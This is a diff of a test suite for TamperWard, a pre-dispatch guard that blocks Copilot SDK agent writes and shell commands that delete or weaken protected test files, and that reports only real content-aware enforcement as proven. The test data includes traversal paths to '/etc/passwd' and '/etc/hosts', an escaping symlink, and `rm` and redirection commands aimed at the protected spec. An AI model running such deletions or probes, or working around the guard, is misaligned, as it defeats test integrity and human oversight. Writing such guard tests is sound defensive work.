@@ -7,12 +7,14 @@
 import { describe, it, expect } from 'vitest';
 import { existsSync, readdirSync, mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
-import { join } from 'node:path';
+import { join, relative } from 'node:path';
 import { copilotSdkAdapter } from '../src/adapters/copilot-sdk/adapter';
 // @ts-expect-error - the orchestrator is a plain .mjs harness module, no d.ts
-import { buildConfig, runQualification, runPreDenyScenario, runBrokenPathScenario, runEndOfTurnScenario, assembleResult, serializeRequest, promptHash, classifyHandlerDispatch, decisionCategory, normalizeCompletionEvent } from '../harness/adapters/copilot-sdk/orchestrator.mjs';
+import { buildConfig, runQualification, runPreDenyScenario, runBrokenPathScenario, runEndOfTurnScenario, assembleResult, serializeRequest, promptHash, classifyHandlerDispatch, decisionCategory, normalizeCompletionEvent, semanticEvaluation, shellRequestMutatesProtected, containedTargetExists } from '../harness/adapters/copilot-sdk/orchestrator.mjs';
+// @ts-expect-error - the reconstruction diagnostics are a plain .mjs harness module, no d.ts
+import { reconstructionDiagnostic } from '../harness/adapters/copilot-sdk/reconstruction-diagnostics.mjs';
 // @ts-expect-error - the fixtures are a plain .mjs harness module, no d.ts
-import { makeScenarioRepo, cleanupRepo, sdkCompletionEventData, PERMISSION_DENIED_CODE, USER_NOT_AVAILABLE_CODE, CANDIDATE_PERMISSION_GATE_CODES, CONFIRMED_PERMISSION_GATE_CODES, isDeniedPermissionKind } from '../harness/adapters/copilot-sdk/fixtures.mjs';
+import { makeScenarioRepo, cleanupRepo, makeEscapingSymlink, sdkCompletionEventData, PERMISSION_DENIED_CODE, USER_NOT_AVAILABLE_CODE, CANDIDATE_PERMISSION_GATE_CODES, CONFIRMED_PERMISSION_GATE_CODES, isDeniedPermissionKind } from '../harness/adapters/copilot-sdk/fixtures.mjs';
 // @ts-expect-error - capture signatures are a plain .mjs harness module, no d.ts
 import { CONFIRMED_PERMISSION_GATE_SIGNATURES } from '../harness/adapters/copilot-sdk/capture-signatures.mjs';
 // @ts-expect-error - the spike is a plain .mjs harness module, no d.ts
@@ -309,6 +311,117 @@ describe('runPreDenyScenario — shell & native-write pre-dispatch deny (real ad
     const seqs = r.evidenceRows.map((e: { host_seq?: number }) => e.host_seq);
     expect(seqs).toEqual([...seqs].sort((a, b) => a - b));
     expect(new Set(seqs).size).toBe(seqs.length);
+  });
+});
+
+describe('#621 — content-aware pre-deny requires SEMANTIC enforcement, not a returned reject', () => {
+  // The live #621 contradiction: a Copilot SDK write that FAILS TamperWard content reconstruction was
+  // reported `pre-deny:file-edit-content = PROVEN` because the classifier read `tamperwardEvaluated`
+  // from `run.proposals.length > 0` and `denyReturned` from the bare presence of a deny. A
+  // fail-closed-UNAVAILABLE deny (reconstruction / policy-load / parse failure) is the SDK reject the
+  // PERMISSION layer honours, but it is NOT content-aware enforcement, so it must land INCOMPLETE.
+
+  it('(B) a write whose reconstruction fails closed is INCOMPLETE for content-aware pre-deny, never PROVEN', async () => {
+    const r = await runPreDenyScenario({ binding: createFakeBinding({ unreconstructableWrite: true }), adapter, config: CFG(), mechanism: 'write' });
+    expect(r.semantic).not.toBe('PROVEN');
+    expect(r.semantic).toBe('INCOMPLETE');
+    expect(r.evidence.observedKind).toBe('write');
+    expect(r.evidence.mechanismConfirmed).toBe(true);
+    // The exact live-run facts that used to false-green PROVEN:
+    expect(r.evidence.rejectReturned).toBe(true); // TamperWard returned a {kind:"reject"} …
+    expect(r.evidence.denyReturned).toBe(false); // … but NOT a content-aware/semantic deny
+    expect(r.evidence.decisionCategory).toBe('fail-closed-unavailable');
+    expect(r.evidence.unavailableReason).toBe('reconstruction');
+    expect(r.evidence.blockingFindingRule).toBe('tamperward-unavailable');
+    expect(r.evidence.semanticEvaluationCompleted).toBe(false);
+    expect(r.evidence.reconstructionCompleted).toBe(false);
+    expect(r.evidence.semanticContentEnforcementProven).toBe(false);
+    // PERMISSION enforcement (non-dispatch) IS separately establishable — a fail-closed-unavailable
+    // deny still proves the SDK honoured the reject and the tool did not run (#621 Work A).
+    expect(r.evidence.handlerDispatched).toBe(false);
+    expect(r.evidence.finalStateMutated).toBe(false);
+    expect(r.permissionEnforcementProven).toBe(true);
+  });
+
+  it('(A) a real reconstructed weakening write (reconstruction + evaluate + real detector block) → content-aware PROVEN', async () => {
+    const r = await runPreDenyScenario({ binding: createFakeBinding({}), adapter, config: CFG(), mechanism: 'write' });
+    expect(r.semantic).toBe('PROVEN');
+    expect(r.evidence.semanticEvaluationCompleted).toBe(true);
+    expect(r.evidence.reconstructionCompleted).toBe(true);
+    expect(r.evidence.semanticContentEnforcementProven).toBe(true);
+    expect(r.evidence.denyReturned).toBe(true);
+    expect(r.evidence.decisionCategory).toBe('policy-block');
+    expect(r.evidence.blockingFindingRule).not.toBe('tamperward-unavailable');
+    expect(typeof r.evidence.blockingFindingRule).toBe('string');
+  });
+
+  it('(C) a write surfacing no usable content (no diff, no newFileContents) → UNSUPPORTED, never PROVEN', async () => {
+    const r = await runPreDenyScenario({ binding: createFakeBinding({ noContentWrite: true }), adapter, config: CFG(), mechanism: 'write' });
+    expect(r.semantic).toBe('UNSUPPORTED');
+    expect(r.evidence.decisionCategory).toBe('unsupported');
+    expect(r.evidence.semanticContentEnforcementProven).toBe(false);
+    expect(r.evidence.semanticEvaluationCompleted).toBe(false);
+  });
+
+  it('Work E: a reconstruction fail-closed emits a BOUNDED, sanitized structural diagnostic — no diff text or file source', async () => {
+    const r = await runPreDenyScenario({ binding: createFakeBinding({ unreconstructableWrite: true }), adapter, config: CFG(), mechanism: 'write' });
+    const diag = r.evidence.reconstructionDiagnostic;
+    expect(diag).toBeTruthy();
+    expect(diag.stage).toBe('reconstruction');
+    expect(diag.fileTargetPresent).toBe(true);
+    expect(diag.diffPresent).toBe(true);
+    expect(typeof diag.diffByteCount).toBe('number');
+    expect(diag.diffByteCount).toBeGreaterThan(0);
+    expect(typeof diag.diffLineCount).toBe('number');
+    expect(diag.newFileContentsPresent).toBe(false);
+    expect(diag.newFileContentsByteCount).toBe(0);
+    // The distinguishing shape category: the diff's headers name a different file than the target.
+    expect(diag.diffShape.category).toBe('path-header-mismatch');
+    expect(diag.diffShape.headerMatchesTarget).toBe(false);
+    expect(diag.diffShape.hunkHeaderCount).toBeGreaterThan(0);
+    expect(diag.failureCategory).toBe('diff:path-header-mismatch');
+    // CONTENT-FREE: neither the candidate diff text nor the file source leaks into a public artifact.
+    const serialized = JSON.stringify(diag);
+    for (const secret of ['keeps one', 'keeps two', 'expect(', 'it(']) expect(serialized).not.toContain(secret);
+    // The same holds for the immutable decision evidence row that persists into the artifact.
+    const decisionRow = r.evidenceRows.find((e: { stage?: string; reconstruction_diagnostic?: unknown }) => e.stage === 'decision' && e.reconstruction_diagnostic);
+    expect(decisionRow).toBeTruthy();
+    for (const secret of ['keeps one', 'keeps two', 'expect(']) expect(JSON.stringify(decisionRow)).not.toContain(secret);
+  });
+
+  it('a landed protected write after a preliminary read is FAIL-OPEN — never downgraded to UNSUPPORTED (#621 review pt 6)', async () => {
+    // The live hosted flow reads before it writes; `benignProtectedEdit` makes TamperWard ALLOW the
+    // protected write (no deny), which then LANDS. The protected proposal must be identified by target
+    // correlation (not "which denied", which would fall back to the preliminary read), and FAIL-OPEN
+    // must dominate any mechanism/UNSUPPORTED reclassification.
+    const r = await runPreDenyScenario({ binding: createFakeBinding({ benignFirst: true, benignProtectedEdit: true }), adapter, config: CFG(), mechanism: 'write' });
+    expect(r.evidence.finalStateMutated).toBe(true);
+    expect(r.semantic).toBe('FAIL-OPEN');
+    expect(r.evidence.observedKind).toBe('write'); // the protected write, not the preliminary read
+    expect(r.evidence.mechanismConfirmed).toBe(true);
+  });
+
+  it('permissionEnforcementProven requires TamperWard’s own reject + a denied resolution (#621 review pt 3)', async () => {
+    // Case B (reconstruction fail-closed) IS a TamperWard reject honoured as non-dispatch → true.
+    const b = await runPreDenyScenario({ binding: createFakeBinding({ unreconstructableWrite: true }), adapter, config: CFG(), mechanism: 'write' });
+    expect(b.permissionEnforcementProven).toBe(true);
+    expect(b.evidence.rejectReturned).toBe(true);
+    expect(b.evidence.dispatchBasis).toBe('permission-denied-resolution');
+    // A landed write (no honoured non-dispatch) is never permission-enforcement-proven.
+    const open = await runPreDenyScenario({ binding: createFakeBinding({ benignProtectedEdit: true }), adapter, config: CFG(), mechanism: 'write' });
+    expect(open.permissionEnforcementProven).toBe(false);
+  });
+
+  it('shell: a non-mutating inspection (cat) of the protected path before the rm is not the protected proposal (#621 re-review pt 4)', async () => {
+    // With inspectFirst, both `cat src/keep.spec.ts` (read) and `rm src/keep.spec.ts` (mutation) name the
+    // protected path. The protected proposal must be the MUTATING `rm` (correctly denied + not dispatched),
+    // not the `cat` whose successful completion would otherwise read as dispatch / FAIL-OPEN.
+    const r = await runPreDenyScenario({ binding: createFakeBinding({ inspectFirst: true }), adapter, config: CFG(), mechanism: 'shell' });
+    expect(r.evidence.observedTool).toBe('shell'); // the rm, whose toolName is 'shell'
+    expect(r.evidence.mechanismConfirmed).toBe(true);
+    expect(r.evidence.finalStateMutated).toBe(false); // the rm was denied and not dispatched
+    expect(r.evidence.handlerDispatched).toBe(false);
+    expect(r.semantic).toBe('PROVEN');
   });
 });
 
@@ -1117,6 +1230,382 @@ describe('#614 — execution_start is lifecycle-start, not dispatch; completion 
     // The host's OWN knowledge that it injected an adversarial identity distinguishes an identity
     // rejection from a baseline/reconstruction fail-closed that also surfaces as tamperward-unavailable.
     expect(decisionCategory({ decision: { verdict: 'deny', findings: [{ rule: 'tamperward-unavailable' }] } }, { adversarialIdentity: true })).toBe('identity-rejected');
+  });
+
+  it('#621 semanticEvaluation distinguishes a REAL content block from a fail-closed-unavailable deny (shell and write alike)', () => {
+    // A real detector block from a completed reconstruction + evaluate — content enforcement PROVEN.
+    const block = semanticEvaluation({ outcome: 'ok', decision: { verdict: 'deny', findings: [{ rule: 'test-deletion' }] } });
+    expect(block.reconstructionCompleted).toBe(true);
+    expect(block.evaluateCompleted).toBe(true);
+    expect(block.realDetectorFinding).toBe(true);
+    expect(block.contentEnforcementProven).toBe(true);
+    expect(block.failClosedUnavailable).toBe(false);
+
+    // A fail-closed-UNAVAILABLE deny (reconstruction/policy-load/parse) — the engine never judged content.
+    for (const stage of ['reconstruction', 'policy-load', 'baseline', 'repo-context'] as const) {
+      const fc = semanticEvaluation({ outcome: 'ok', unavailableReason: stage, decision: { verdict: 'deny', findings: [{ rule: 'tamperward-unavailable' }] } });
+      expect(fc.failClosedUnavailable).toBe(true);
+      expect(fc.reconstructionCompleted).toBe(false);
+      expect(fc.evaluateCompleted).toBe(false);
+      expect(fc.contentEnforcementProven).toBe(false);
+      expect(fc.category).toBe('fail-closed-unavailable');
+    }
+
+    // An EVALUATE-stage failure means reconstruction DID complete (the adapter runs reconstruction then
+    // evaluate) — only the semantic evaluation is incomplete (#621 review point 4).
+    const evalFail = semanticEvaluation({ outcome: 'ok', unavailableReason: 'evaluate', decision: { verdict: 'deny', findings: [{ rule: 'tamperward-unavailable' }] } });
+    expect(evalFail.reconstructionCompleted).toBe(true);
+    expect(evalFail.evaluateCompleted).toBe(false);
+    expect(evalFail.contentEnforcementProven).toBe(false);
+
+    // An IDENTITY rejection happens BEFORE reconstruction/evaluate run, so neither completed (#621
+    // re-review point 3) — even though outcome is 'ok' with a sentinel deny.
+    const idReject = semanticEvaluation({ outcome: 'ok', unavailableReason: 'identity-rejected', decision: { verdict: 'deny', findings: [{ rule: 'tamperward-unavailable' }] } });
+    expect(idReject.reconstructionCompleted).toBe(false);
+    expect(idReject.evaluateCompleted).toBe(false);
+    expect(idReject.contentEnforcementProven).toBe(false);
+
+    // An allow (evaluated, no finding), an unsupported (no usable content), and a parse-failure are all
+    // NOT content enforcement.
+    expect(semanticEvaluation({ outcome: 'ok', decision: { verdict: 'allow', findings: [] } }).contentEnforcementProven).toBe(false);
+    expect(semanticEvaluation({ outcome: 'ok', decision: { verdict: 'allow', findings: [] } }).evaluateCompleted).toBe(true);
+    const unsup = semanticEvaluation({ outcome: 'unsupported' });
+    expect(unsup.reconstructionCompleted).toBe(false);
+    expect(unsup.contentEnforcementProven).toBe(false);
+    expect(unsup.category).toBe('unsupported');
+    expect(semanticEvaluation({ outcome: 'parse-failure', unavailableReason: 'parse-failure', decision: { verdict: 'deny', findings: [{ rule: 'tamperward-unavailable' }] } }).contentEnforcementProven).toBe(false);
+  });
+
+  it('#621 Work E reconstructionDiagnostic models the parser grammar, is bounded, sanitized, content-free', () => {
+    const secret = "it('keeps two', () => { expect(2).toBe(2); });";
+    const target = 'src/keep.spec.ts';
+
+    // A hunk-only body with no ---/+++ headers.
+    const hunkOnly = reconstructionDiagnostic({ path: target, diff: `@@ -1,2 +1,1 @@\n ok\n-${secret}` }, 'reconstruction');
+    expect(hunkOnly.diffShape.category).toBe('headerless-hunk-only');
+    expect(hunkOnly.failureCategory).toBe('diff:headerless-hunk-only');
+    expect(hunkOnly.diffUsable).toBe(true);
+    expect(hunkOnly.newFileContentsPresent).toBe(false);
+    expect(JSON.stringify(hunkOnly)).not.toContain('keeps two');
+
+    // A header whose path does not match the declared target → path-header-mismatch.
+    const mismatch = reconstructionDiagnostic({ path: target, diff: '--- a/other/file.ts\n+++ b/other/file.ts\n@@ -1 +1 @@\n-a\n+b' }, 'reconstruction');
+    expect(mismatch.diffShape.category).toBe('path-header-mismatch');
+    expect(mismatch.diffShape.headerMatchesTarget).toBe(false);
+
+    // Two DIFFERENT endpoint paths before the (single) hunk → multiple-file-diff.
+    const multi = reconstructionDiagnostic({ path: target, diff: '--- a/x\n+++ b/y\n@@ -1 +1 @@\n-a\n+b' }, 'reconstruction');
+    expect(multi.diffShape.category).toBe('multiple-file-diff');
+
+    // PARSER FIDELITY: `---`/`+++` INSIDE a hunk body must NOT be read as headers (the parser only reads
+    // identity before the first `@@ ` hunk). A create diff whose added lines happen to start with `+++`
+    // is still a well-formed single-file create shape, not a phantom multi-file / mismatch.
+    const hunkBodyMarkers = reconstructionDiagnostic(
+      { path: target, diff: `--- a/${target}\n+++ b/${target}\n@@ -1,1 +1,2 @@\n a\n+++ this is content, not a header` },
+      'reconstruction',
+    );
+    expect(hunkBodyMarkers.diffShape.oldFileHeaderCount).toBe(1);
+    expect(hunkBodyMarkers.diffShape.newFileHeaderCount).toBe(1);
+    expect(hunkBodyMarkers.diffShape.category).toBe('full-unified-diff');
+
+    // PARSER FIDELITY: `new file mode` / `deleted file mode` are SUPPORTED metadata (accepted with a
+    // create/delete endpoint pair), never `unsupported-metadata`.
+    const createMode = reconstructionDiagnostic(
+      { path: target, diff: `diff --git a/${target} b/${target}\nnew file mode 100644\n--- /dev/null\n+++ b/${target}\n@@ -0,0 +1,1 @@\n+x` },
+      'reconstruction',
+    );
+    expect(createMode.diffShape.createModeMetadata).toBe(true);
+    expect(createMode.diffShape.unsupportedMetadata).toBe(false);
+    expect(createMode.diffShape.category).not.toBe('unsupported-metadata');
+    expect(createMode.diffShape.impliedOperation).toBe('create');
+
+    // Rename metadata → unsupported-metadata.
+    const rename = reconstructionDiagnostic({ path: target, diff: `diff --git a/${target} b/renamed.ts\nrename from ${target}\nrename to renamed.ts\n@@ -1 +1 @@\n-a\n+b` }, 'reconstruction');
+    expect(rename.diffShape.category).toBe('unsupported-metadata');
+
+    // Duplicate endpoints → duplicate-endpoint (the parser rejects duplicates; not full-unified-diff).
+    const dup = reconstructionDiagnostic({ path: target, diff: `--- a/${target}\n--- a/${target}\n+++ b/${target}\n@@ -1 +1 @@\n-a\n+b` }, 'reconstruction');
+    expect(dup.diffShape.category).toBe('duplicate-endpoint');
+
+    // PRESENCE semantics match sdkFileEditChanges: empty newFileContents is PRESENT; whitespace-only diff
+    // is UNUSABLE.
+    const emptyContents = reconstructionDiagnostic({ path: target, newFileContents: '' }, 'reconstruction');
+    expect(emptyContents.newFileContentsPresent).toBe(true);
+    expect(emptyContents.failureCategory).toBe('new-file-contents-only');
+    const wsDiff = reconstructionDiagnostic({ path: target, diff: '   \n  ' }, 'reconstruction');
+    expect(wsDiff.diffUsable).toBe(false);
+    expect(wsDiff.failureCategory).toBe('no-usable-content');
+
+    // No content at all.
+    const none = reconstructionDiagnostic({ path: target }, 'reconstruction');
+    expect(none.failureCategory).toBe('no-usable-content');
+    expect(none.diffUsable).toBe(false);
+
+    // BOUNDED + SANITIZED: byte counts are recorded, the content never appears, and the raw target path
+    // is NOT persisted — only a hash + shape flags.
+    const contentsOnly = reconstructionDiagnostic({ path: '/abs/secret/path/keep.spec.ts', newFileContents: secret }, 'reconstruction');
+    expect(contentsOnly.newFileContentsPresent).toBe(true);
+    expect(contentsOnly.newFileContentsByteCount).toBe(Buffer.byteLength(secret, 'utf8'));
+    expect(contentsOnly.failureCategory).toBe('new-file-contents-only');
+    expect(contentsOnly.target.present).toBe(true);
+    expect(contentsOnly.target.absolute).toBe(true);
+    expect(typeof contentsOnly.target.hash).toBe('string');
+    const s = JSON.stringify(contentsOnly);
+    expect(s).not.toContain('keeps two');
+    expect(s).not.toContain('/abs/secret/path'); // raw path never persisted
+
+    // PARSER FIDELITY: the pre-hunk grammar is TOTAL — an unrecognized non-blank header line makes the
+    // parser fail closed BEFORE git apply, so it must not read as full-unified-diff (#621 re-review pt 2).
+    const unrecognized = reconstructionDiagnostic(
+      { path: target, diff: `--- a/${target}\n+++ b/${target}\nunexpected header\n@@ -1 +1 @@\n-a\n+b` },
+      'reconstruction',
+    );
+    expect(unrecognized.diffShape.unrecognizedHeader).toBe(true);
+    expect(unrecognized.diffShape.category).toBe('unrecognized-header');
+
+    // PARSER FIDELITY: DUPLICATE create/delete-mode metadata is rejected (not laundered).
+    const dupMode = reconstructionDiagnostic(
+      { path: target, diff: `diff --git a/${target} b/${target}\nnew file mode 100644\nnew file mode 100644\n--- /dev/null\n+++ b/${target}\n@@ -0,0 +1 @@\n+x` },
+      'reconstruction',
+    );
+    expect(dupMode.diffShape.createModeMetadataCount).toBe(2);
+    expect(dupMode.diffShape.duplicateModeMetadata).toBe(true);
+    expect(dupMode.diffShape.category).toBe('duplicate-metadata');
+
+    // TARGET NORMALIZATION: an ABSOLUTE in-repo fileName, normalized (targetRel) to the same repo-relative
+    // path the headers use, must NOT read as a path-header-mismatch (#621 re-review pt 2).
+    const absMatch = reconstructionDiagnostic(
+      { path: `/repo/${target}`, targetRel: target, diff: `--- a/${target}\n+++ b/${target}\n@@ -1 +1 @@\n-a\n+b` },
+      'reconstruction',
+    );
+    expect(absMatch.diffShape.headerMatchesTarget).toBe(true);
+    expect(absMatch.diffShape.category).toBe('full-unified-diff');
+
+    // BOUNDED BY CONSTRUCTION: neither a huge non-whitespace diff, a huge WHITESPACE-only diff (the
+    // `trim()` worst case), nor a huge target string produces an unbounded read — counts are flagged
+    // lower bounds and usability comes from a bounded scan (#621 re-review pt 1).
+    const huge = reconstructionDiagnostic({ path: target, diff: 'x'.repeat(5_000_000) }, 'reconstruction');
+    expect(huge.diffByteCountTruncated).toBe(true);
+    expect(huge.diffByteCount).toBeLessThan(5_000_000);
+    const hugeWs = reconstructionDiagnostic({ path: target, diff: ' '.repeat(5_000_000) }, 'reconstruction');
+    // All-whitespace WITHIN the scanned prefix but truncated past it → usability is unknown, not a
+    // definite no-usable-content (the parser trims the full string).
+    expect(hugeWs.diffUsableKnown).toBe(false);
+    expect(hugeWs.diffShape.category).toBe('unknown-truncated');
+    const hugeTarget = reconstructionDiagnostic({ path: 'a'.repeat(5_000_000), newFileContents: 'x' }, 'reconstruction');
+    expect(hugeTarget.target.hashTruncated).toBe(true);
+    expect(hugeTarget.target.byteCountTruncated).toBe(true);
+
+    // TRUNCATION HONESTY (#621 re-review pt 1): whitespace fills the scan prefix and a real diff follows
+    // within the parser's byte budget → the diagnostic must NOT assert `no-usable-content`; it reports
+    // an explicit unknown-truncated state.
+    const wsThenDiff = reconstructionDiagnostic(
+      { path: target, diff: ' '.repeat(262_144) + `\n--- a/other.ts\n+++ b/other.ts\n@@ -1 +1 @@\n-a\n+b` },
+      'reconstruction',
+    );
+    expect(wsThenDiff.diffShape.category).toBe('unknown-truncated');
+    expect(wsThenDiff.failureCategory).toBe('diff:unknown-truncated');
+    expect(wsThenDiff.diffUsableKnown).toBe(false);
+    // A capped scan that never reaches the first hunk is unknown-truncated, not a definite no-hunk.
+    // A >5 MB diff exceeds the parser byte budget (384 KiB) — a definite pre-parse rejection.
+    const hugeHeaderNoHunk = reconstructionDiagnostic({ path: target, diff: `--- a/${target}\n` + 'x'.repeat(5_000_000) }, 'reconstruction');
+    expect(hugeHeaderNoHunk.diffShape.category).toBe('over-byte-budget');
+
+    // OPERATION-CONSISTENCY (#621 re-review pt 2): `new file mode` / `deleted file mode` with endpoints
+    // that imply a different op is a parser reject BEFORE git apply — not full-unified-diff.
+    const createModeModify = reconstructionDiagnostic(
+      { path: target, diff: `--- a/${target}\n+++ b/${target}\nnew file mode 100644\n@@ -1 +1 @@\n-a\n+b` },
+      'reconstruction',
+    );
+    expect(createModeModify.diffShape.metadataOperationMismatch).toBe(true);
+    expect(createModeModify.diffShape.category).toBe('metadata-operation-mismatch');
+    const deleteModeModify = reconstructionDiagnostic(
+      { path: target, diff: `--- a/${target}\n+++ b/${target}\ndeleted file mode 100644\n@@ -1 +1 @@\n-a\n+b` },
+      'reconstruction',
+    );
+    expect(deleteModeModify.diffShape.category).toBe('metadata-operation-mismatch');
+    // A create-mode WITH create endpoints is consistent → not a mismatch.
+    const createModeCreate = reconstructionDiagnostic(
+      { path: target, diff: `new file mode 100644\n--- /dev/null\n+++ b/${target}\n@@ -0,0 +1 @@\n+x` },
+      'reconstruction',
+    );
+    expect(createModeCreate.diffShape.metadataOperationMismatch).toBe(false);
+    expect(createModeCreate.diffShape.category).not.toBe('metadata-operation-mismatch');
+
+    // METADATA WITHOUT ENDPOINTS (#621 re-review 4 pt 2): operation-bearing metadata + a hunk but no
+    // ---/+++ pair is a parser reject BEFORE git apply, not headerless-hunk-only.
+    const indexNoEndpoints = reconstructionDiagnostic({ path: target, diff: `index 1111111..2222222 100644\n@@ -1 +1 @@\n-a\n+b` }, 'reconstruction');
+    expect(indexNoEndpoints.diffShape.metadataWithoutEndpoints).toBe(true);
+    expect(indexNoEndpoints.diffShape.category).toBe('metadata-without-endpoints');
+    const gitDiffNoEndpoints = reconstructionDiagnostic({ path: target, diff: `diff --git a/${target} b/${target}\n@@ -1 +1 @@\n-a\n+b` }, 'reconstruction');
+    expect(gitDiffNoEndpoints.diffShape.category).toBe('metadata-without-endpoints');
+    // A genuinely headerless hunk (no semantic metadata) stays headerless-hunk-only.
+    expect(reconstructionDiagnostic({ path: target, diff: `@@ -1 +1 @@\n-a\n+b` }, 'reconstruction').diffShape.category).toBe('headerless-hunk-only');
+
+    // OPERATION vs DISK STATE (#621 re-review 4 pt 2): a create against an EXISTING target, or a
+    // modify/delete against an ABSENT target, is rejected before git apply — categorized only when the
+    // host supplies the bounded targetExists fact.
+    const createExisting = reconstructionDiagnostic(
+      { path: target, targetExists: true, diff: `--- /dev/null\n+++ b/${target}\n@@ -0,0 +1 @@\n+x` },
+      'reconstruction',
+    );
+    expect(createExisting.diffShape.operationStateMismatch).toBe(true);
+    expect(createExisting.diffShape.category).toBe('operation-state-mismatch');
+    const modifyAbsent = reconstructionDiagnostic(
+      { path: target, targetExists: false, diff: `--- a/${target}\n+++ b/${target}\n@@ -1 +1 @@\n-a\n+b` },
+      'reconstruction',
+    );
+    expect(modifyAbsent.diffShape.category).toBe('operation-state-mismatch');
+    // A consistent modify against an existing target is not a state mismatch.
+    const modifyExisting = reconstructionDiagnostic(
+      { path: target, targetExists: true, diff: `--- a/${target}\n+++ b/${target}\n@@ -1 +1 @@\n-a\n+b` },
+      'reconstruction',
+    );
+    expect(modifyExisting.diffShape.operationStateMismatch).toBe(false);
+    // Without a targetExists fact, no operation-state claim is made.
+    const modifyUnknownState = reconstructionDiagnostic({ path: target, diff: `--- a/${target}\n+++ b/${target}\n@@ -1 +1 @@\n-a\n+b` }, 'reconstruction');
+    expect(modifyUnknownState.diffShape.operationStateMismatch).toBe(false);
+
+    // /dev/null ON BOTH SIDES (#621 re-review 5 pt 3): a parser reject, not full-unified-diff.
+    const devNullBoth = reconstructionDiagnostic({ path: target, diff: `--- /dev/null\n+++ /dev/null\n@@ -0,0 +0,0 @@\n+x` }, 'reconstruction');
+    expect(devNullBoth.diffShape.category).toBe('dev-null-both-sides');
+
+    // PARSER BUDGET rejections (#621 re-review 6 pt 2): a structurally-valid diff over the byte or line
+    // budget is rejected BEFORE grammar/git — not `full-unified-diff`.
+    const overLine = reconstructionDiagnostic(
+      { path: target, targetExists: true, diff: `--- a/${target}\n+++ b/${target}\n@@ -1,4100 +1,4100 @@\n` + ' a\n'.repeat(4100) },
+      'reconstruction',
+    );
+    expect(overLine.diffShape.overLineBudget).toBe(true);
+    expect(overLine.diffShape.category).toBe('over-line-budget');
+    const overByte = reconstructionDiagnostic(
+      { path: target, targetExists: true, diff: `--- a/${target}\n+++ b/${target}\n@@ -1 +1 @@\n-a\n+` + 'x'.repeat(400 * 1024) },
+      'reconstruction',
+    );
+    expect(overByte.diffShape.overByteBudget).toBe(true);
+    expect(overByte.diffShape.category).toBe('over-byte-budget');
+  });
+
+  it('#621 re-review 5 pt 2 — containedTargetExists never probes outside the trusted repository root', () => {
+    const repo = makeScenarioRepo({ prefix: 'tw-sdk-contain-' }) as { root: string; protectedRel: string };
+    try {
+      // In-root existing file → true; in-root absent → false (a create).
+      expect(containedTargetExists(repo.protectedRel, repo.root, repo.root)).toBe(true);
+      expect(containedTargetExists('src/does-not-exist.ts', repo.root, repo.root)).toBe(false);
+      // OUT-OF-ROOT (absolute, or a `../` escape) → undefined, and no external path is stat'd.
+      expect(containedTargetExists('/etc/hosts', repo.root, repo.root)).toBeUndefined();
+      expect(containedTargetExists('../../../../etc/passwd', repo.root, repo.root)).toBeUndefined();
+      // A directory (not a regular file) → undefined, never reported as an existing file.
+      expect(containedTargetExists('src', repo.root, repo.root)).toBeUndefined();
+      // No fileName → undefined.
+      expect(containedTargetExists(undefined, repo.root, repo.root)).toBeUndefined();
+      // An IN-REPO SYMLINK whose real target escapes the root → undefined, and never followed/probed
+      // (the walk classifies the symlink with lstat and stops) (#621 re-review 6 pt 3).
+      const { linkPath } = makeEscapingSymlink(repo.root) as { linkPath: string };
+      const linkRel = relative(repo.root, linkPath);
+      expect(containedTargetExists(linkRel, repo.root, repo.root)).toBeUndefined();
+      expect(containedTargetExists(join(linkRel, 'secret.txt'), repo.root, repo.root)).toBeUndefined();
+      // An OVERSIZE regular file (parser fails on read, not op-state) → undefined. Exercised with an
+      // injected tiny cap so the case is deterministic without a 64 MiB file.
+      writeFileSync(join(repo.root, 'big.bin'), 'x'.repeat(4096));
+      expect(containedTargetExists('big.bin', repo.root, repo.root, { readCap: 10 })).toBeUndefined();
+      expect(containedTargetExists('big.bin', repo.root, repo.root)).toBe(true); // within the default cap → a normal existing file
+    } finally {
+      cleanupRepo(repo, false);
+    }
+  });
+
+  it('#621 re-review — shellRequestMutatesProtected returns an explicit strength/basis, never collapsing ambiguity', () => {
+    const protectedRel = 'src/keep.spec.ts';
+    const isProtected = (p: unknown) => p === protectedRel;
+    const seg = (fullCommandText: string) => ({ identifier: fullCommandText.split(/\s+/)[0], fullCommandText });
+    const withSegs = (fullCommandText: string, cmds: { identifier: string; readOnly: boolean }[], extra: Record<string, unknown> = {}) => ({
+      kind: 'shell',
+      fullCommandText,
+      commands: cmds,
+      commandSegments: fullCommandText.split(/\s*;\s*/).map(seg),
+      possiblePaths: [...fullCommandText.matchAll(/([\w./-]+\.\w+)/g)].map((m) => m[1]),
+      ...extra,
+    });
+    // STRUCTURED per-segment: rm of the protected path → confident mutation.
+    let r = shellRequestMutatesProtected(withSegs(`rm ${protectedRel}`, [{ identifier: 'rm', readOnly: false }]), isProtected, protectedRel);
+    expect(r.value).toBe(true);
+    expect(r.basis).toBe('structured-segment');
+    // cat of the protected path → not a mutation.
+    expect(shellRequestMutatesProtected(withSegs(`cat ${protectedRel}`, [{ identifier: 'cat', readOnly: true }]), isProtected, protectedRel).value).toBe(false);
+    // COMPOUND with segments: mutate another file, read protected → not a protected mutation.
+    expect(
+      shellRequestMutatesProtected(withSegs(`rm other.txt ; cat ${protectedRel}`, [{ identifier: 'rm', readOnly: false }, { identifier: 'cat', readOnly: true }]), isProtected, protectedRel).value,
+    ).toBe(false);
+    // A write-file redirection into the protected path (per-segment) → mutation.
+    expect(
+      shellRequestMutatesProtected(withSegs(`echo x > ${protectedRel}`, [{ identifier: 'echo', readOnly: true }], { hasWriteFileRedirection: true }), isProtected, protectedRel).value,
+    ).toBe(true);
+
+    // commandSegments ABSENT (optional in v1.0.14):
+    // - COMPOUND (mutate other, read protected), no segments → INSUFFICIENT (undefined), NOT collapsed to true.
+    const compoundNoSegs = { kind: 'shell', fullCommandText: `rm other.txt ; cat ${protectedRel}`, commands: [{ identifier: 'rm', readOnly: false }, { identifier: 'cat', readOnly: true }], possiblePaths: ['other.txt', protectedRel], hasWriteFileRedirection: false };
+    r = shellRequestMutatesProtected(compoundNoSegs, isProtected, protectedRel);
+    expect(r.value).toBeUndefined();
+    expect(r.basis).toBe('insufficient');
+    // - single `rm protected`, no segments, protected is the ONLY possible path → provable, unambiguous.
+    const singleNoSegs = { kind: 'shell', fullCommandText: `rm ${protectedRel}`, commands: [{ identifier: 'rm', readOnly: false }], possiblePaths: [protectedRel], hasWriteFileRedirection: false };
+    r = shellRequestMutatesProtected(singleNoSegs, isProtected, protectedRel);
+    expect(r.value).toBe(true);
+    expect(r.basis).toBe('unambiguous-single-command');
